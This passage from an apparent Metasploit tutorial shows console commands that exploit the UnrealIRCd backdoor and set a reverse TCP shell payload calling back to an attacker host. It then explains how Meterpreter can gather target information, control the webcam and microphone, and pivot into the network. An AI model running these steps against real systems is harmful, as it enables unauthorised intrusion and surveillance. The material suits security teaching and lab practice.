    msf exploit(unreal_ircd_3281_backdoor) > set PAYLOAD generic/shell_reverse_tcp
    ❸

    PAYLOAD => generic/shell_reverse_tcp

    msf exploit(unreal_ircd_3281_backdoor) > set LHOST 192.168.12.34 ❹

    LHOST => 192.168.12.34

    msf exploit(unreal_ircd_3281_backdoor) > exploit ❺

    ```


    Depending on the type of exploit, once our exploit is complete we will normally
    end up with either a remote shell to the computer or a Meterpreter shell.


    A remote shell is basically a remote terminal connection or a text version of
    a remote desktop for Windows users. It allows us to enter commands as if we are
    sitting at the keyboard.


    But a Meterpreter shell offers a ton of interesting programs and utilities that
    we can run to gather information about the target machine, control devices like
    the webcam and microphone, or even use this foothold to get further access into
    the network.


    And of course, if needed, you can drop to a regular shell at any time.


    In most cases, depending on what you are trying to do, a Meterpreter Shell is
    much more advantageous than just a regular shell.


    We will discuss the Meterpreter Shell later, but for now let''s quickly cover
    the first five steps.


    > **Tech Note:**


    When all else fails and you start to feel lost in Metasploit, or the Meterpreter
    shell, try typing the "*help*" command.


    You can also use the "tab" key to autocomplete a line or hit it twice to show
    all available exploits and payloads.


    Ex. *show exploits <tab><tab>*


